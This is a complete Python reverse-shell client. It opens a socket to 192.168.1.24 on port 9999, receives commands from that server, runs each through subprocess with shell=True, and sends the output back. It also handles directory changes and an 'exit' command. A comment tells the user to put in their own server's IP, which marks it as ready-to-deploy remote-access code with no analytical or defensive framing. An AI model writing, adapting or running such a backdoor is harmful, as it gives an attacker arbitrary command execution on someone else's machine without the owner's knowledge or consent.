import socket
import subprocess
import os

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.1.24', 9999))  # Replace with your server's IP address

    while True:
        command = client.recv(1024).decode()  # Receive command from server
        if command.lower() == 'exit':
            break
        if command.startswith('cd '):  # Change directory
            try:
                os.chdir(command.strip('cd '))
                client.send(b'Changed directory')
            except FileNotFoundError as e:
                client.send(str(e).encode())
        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            client.send(output.stdout + output.stderr)  # Send back command output

    client.close()

if __name__ == "__main__":
    connect_to_server()
